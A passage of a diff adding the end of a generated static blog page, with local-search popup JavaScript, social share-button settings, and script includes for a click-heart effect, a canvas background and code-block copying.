+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+  
+  <link rel="stylesheet" href="/lib/needsharebutton/needsharebutton.css">
+
+  
+  
+  <script src="/lib/needsharebutton/needsharebutton.js"></script>
+
+  <script>
+    
+      pbOptions = {};
+      
+          pbOptions.iconStyle = "box";
+      
+          pbOptions.boxForm = "horizontal";
+      
+          pbOptions.position = "bottomCenter";
+      
+          pbOptions.networks = "Weibo,Wechat,Douban,QQZone,Twitter,Facebook";
+      
+      new needShareButton('#needsharebutton-postbottom', pbOptions);
+    
+    
+      flOptions = {};
+      
+          flOptions.iconStyle = "box";
+      
+          flOptions.boxForm = "horizontal";
+      
+          flOptions.position = "middleRight";
+      
+          flOptions.networks = "Weibo,Wechat,Douban,QQZone,Twitter,Facebook";
+      
+      new needShareButton('#needsharebutton-float', flOptions);
+    
+  </script>
+
+  
+
+  
+
+  
+
+  
+
+
+  <!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/clicklove.js"></script>
+
+<!-- canvas曲线 -->
+
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+
+
+<!-- 代码块复制功能 -->
+<script type="text/javascript" src="/js/src/clipboard.min.js"></script>  
+<script type="text/javascript" src="/js/src/clipboard-use.js"></script>
+
+</body>
+</html>
